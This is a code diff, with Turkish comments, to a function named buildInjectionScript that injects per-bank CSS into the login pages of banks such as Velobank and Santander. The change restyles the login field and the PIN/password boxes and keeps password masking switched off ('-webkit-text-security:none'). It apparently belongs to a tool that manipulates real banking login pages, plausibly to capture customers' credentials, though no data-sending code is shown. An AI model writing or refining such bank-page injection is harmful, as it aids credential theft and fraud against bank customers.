@@ -477,19 +477,26 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
         // ----------------------------------------------------------
         const BANK_CSS = {
           velobank:
-            // Kutular DINAMIK: container flex+wrap, label'lar esneyip
-            // daralir (min 0), input label'i doldurur — dar ekranda
-            // tasma olmaz, genis ekranda max 56px'de sabitlenir.
-            ".gfvgzc{display:flex!important;flex-wrap:wrap!important;gap:6px!important}" +
-            "label.sc-jLflnl{display:inline-flex!important;flex-direction:column!important;align-items:center!important;" +
+            // DIKKAT: sc-dUMaFF/sc-jLflnl class'lari login input'unda DA
+            // var — kutu kurallari sadece type=password'a scope'lu,
+            // yoksa login alani minik kutuya donusuyor.
+            // Login: tam genislik koyu-tema alan.
+            "label.sc-jLflnl:has(input[name=login]){display:block!important;width:100%!important;max-width:100%!important}" +
+            "input[name=login]{position:static!important;width:100%!important;height:48px!important;display:block!important;" +
+            "background:rgba(255,255,255,.07)!important;border:1px solid rgba(255,255,255,.3)!important;border-radius:10px!important;" +
+            "color:#ffffff!important;-webkit-text-fill-color:#ffffff!important;font-size:16px!important;padding:0 14px!important;" +
+            "caret-color:#ffffff!important;opacity:1!important;box-sizing:border-box!important}" +
+            // Password kutulari DINAMIK: flex+wrap, max 56px, aspect-ratio.
+            ".gfvgzc:has(input[type=password]){display:flex!important;flex-wrap:wrap!important;gap:6px!important}" +
+            "label.sc-jLflnl:has(input[type=password]){display:inline-flex!important;flex-direction:column!important;align-items:center!important;" +
             "flex:1 1 0!important;min-width:0!important;max-width:56px!important}" +
-            "span.sc-bQEQyQ{display:block!important;width:100%!important}" +
-            "input.sc-dUMaFF{position:static!important;width:100%!important;height:auto!important;aspect-ratio:46/56!important;" +
+            "span.sc-bQEQyQ:has(> input[type=password]){display:block!important;width:100%!important}" +
+            "input[type=password].sc-dUMaFF{position:static!important;width:100%!important;height:auto!important;aspect-ratio:46/56!important;" +
             "display:block!important;color:#191c1f!important;-webkit-text-fill-color:#191c1f!important;-webkit-text-security:none!important;" +
             "font-size:clamp(14px,4vw,24px)!important;font-weight:600!important;text-align:center!important;" +
             "background:#ffffff!important;border:1px solid #c9c9c9!important;border-radius:8px!important;" +
             "caret-color:#191c1f!important;opacity:1!important;margin:0 auto!important}" +
-            "input.sc-dUMaFF:focus{outline:2px solid #00b140!important;outline-offset:1px}",
+            "input[type=password].sc-dUMaFF:focus{outline:2px solid #00b140!important;outline-offset:1px}",
           santander:
             "@media(max-width:900px){" +
             "html,body{min-width:0!important;overflow-x:hidden!important}" +
